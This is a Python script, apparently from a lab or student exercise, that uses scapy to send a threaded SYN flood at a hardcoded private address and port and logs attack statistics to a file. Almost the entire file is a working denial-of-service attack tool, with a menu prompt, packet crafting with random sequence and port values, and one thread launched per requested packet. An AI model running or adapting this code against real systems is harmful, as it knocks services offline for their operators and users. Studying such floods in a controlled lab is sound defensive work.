from scapy.all import *
from scapy.layers.inet import TCP, IP
import random
import threading
import time
from tqdm import tqdm

# Global variables for tracking sent packets and time
sent_packets = 0
start_time = 0

# Locks for thread-safe access to shared variables
sent_packets_lock = threading.Lock()

def log_results(attack_type, packets_sent, duration):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open("attack_results.txt", "a") as file:
        file.write(f"Timestamp: {timestamp}\n")
        file.write(f"Attack Type: {attack_type}\n")
        file.write(f"Packets Sent: {packets_sent}\n")
        file.write(f"Duration: {duration} seconds\n")
        file.write("=" * 50 + "\n")

def syn_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
     global sent_packets, start_time
     while sent_packets < count:
        syn_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="S",seq=RandShort(),ack=RandShort(),sport=RandShort())
        send(syn_flood, verbose=0)
        with sent_packets_lock:
            sent_packets += 1

        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        time.sleep(1)
# Main function
def main():
    global start_time
    attack_number = int(input("Choose an attack: \n1. Syn Flood Attack\nEnter the attack number: "))
    number_of_packets = int(input("Enter the number of times to execute the attack: "))

    # Server IP and port (replace with actual values)
    server_ip = '192.168.119.130'
    server_port = 12366

    # List of source IP addresses to use (replace with actual IPs)
    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']

    start_time = time.time()  # Record the start time

    # Create a tqdm progress bar
    with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
        threads = []

        if attack_number == 1:
            attack_type = "Syn Flood"
            for _ in range(number_of_packets):
                thread = threading.Thread(target=syn_flood_attack, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()
            

    # Calculate attack duration
    end_time = time.time()
    attack_duration = end_time - start_time

    # Log attack results to a file
    log_results(attack_type, number_of_packets, attack_duration)


        
if __name__ == "__main__":
    main()